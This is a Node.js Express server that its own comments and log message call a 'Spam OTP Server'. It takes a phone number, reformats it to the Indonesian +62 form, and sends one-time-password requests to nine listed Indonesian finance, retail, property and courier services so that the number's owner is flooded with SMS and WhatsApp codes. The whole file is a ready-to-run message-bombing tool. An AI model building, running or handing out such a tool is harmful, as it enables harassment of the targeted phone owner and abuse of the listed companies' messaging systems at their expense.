const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

// ========== DAFTAR LAYANAN DAN ENDPOINT OTP ==========
const services = [
    { 
        name: "Adira Finance", 
        endpoint: "https://www.adira.co.id/api/otp", 
        method: "POST",
        payload: (phone) => ({
            phone: phone,
            type: "login"
        })
    },
    { 
        name: "Jaringan IDN", 
        endpoint: "https://api.jaringanidn.com/v1/otp", 
        method: "POST",
        payload: (phone) => ({
            msisdn: phone,
            action: "send_otp"
        })
    },
    { 
        name: "Kredit Pintar", 
        endpoint: "https://api.kreditpintar.com/auth/otp", 
        method: "POST",
        payload: (phone) => ({
            phoneNumber: phone,
            channel: "whatsapp"
        })
    },
    { 
        name: "KTA Kilat", 
        endpoint: "https://api.ktakilat.com/v2/otp", 
        method: "POST",
        payload: (phone) => ({
            mobile: phone,
            otpType: "registration"
        })
    },
    { 
        name: "matahari OTP", 
        endpoint: "https://api.matahari.com/auth/otp", 
        method: "POST",
        payload: (phone) => ({
            phone: phone,
            purpose: "verification"
        })
    },
    { 
        name: "Paper ID", 
        endpoint: "https://api.paper.id/otp/request", 
        method: "POST",
        payload: (phone) => ({
            phone: phone,
            appId: "SMXL"
        })
    },
    { 
        name: "Rumah123", 
        endpoint: "https://api.rumah123.com/v1/otp", 
        method: "POST",
        payload: (phone) => ({
            phoneNumber: phone,
            otpType: "login"
        })
    },
    { 
        name: "SiCepat OTP", 
        endpoint: "https://api.sicepat.com/otp", 
        method: "POST",
        payload: (phone) => ({
            phone: phone,
            service: "delivery"
        })
    },
    { 
        name: "Singa Fintech", 
        endpoint: "https://api.singafintech.com/otp", 
        method: "POST",
        payload: (phone) => ({
            phoneNumber: phone,
            channel: "sms"
        })
    }
];

// ========== ENDPOINT SPAM ==========
app.post('/api/spam-otp', async (req, res) => {
    const { phone } = req.body;
    
    if (!phone || phone.length < 10) {
        return res.status(400).json({ error: "Nomor HP tidak valid" });
    }

    // Format nomor ke 62xxx
    let formattedPhone = phone.replace(/^0/, '62');
    if (!formattedPhone.startsWith('62')) {
        formattedPhone = '62' + formattedPhone;
    }

    const results = [];
    
    // Kirim ke semua layanan
    for (const service of services) {
        try {
            const payload = service.payload(formattedPhone);
            
            const response = await axios({
                method: service.method,
                url: service.endpoint,
                data: payload,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 5000 // 5 detik timeout
            });

            results.push({
                service: service.name,
                status: 'success',
                code: response.status,
                data: response.data
            });

        } catch (error) {
            results.push({
                service: service.name,
                status: 'failed',
                error: error.message
            });
        }
    }

    res.json({
        total: services.length,
        success: results.filter(r => r.status === 'success').length,
        failed: results.filter(r => r.status === 'failed').length,
        results: results
    });
});

// ========== JALANKAN SERVER ==========
app.listen(port, () => {
    console.log(`🚀 Spam OTP Server running di http://localhost:${port}`);
    console.log(`📱 Layanan terdaftar: ${services.length}`);
});
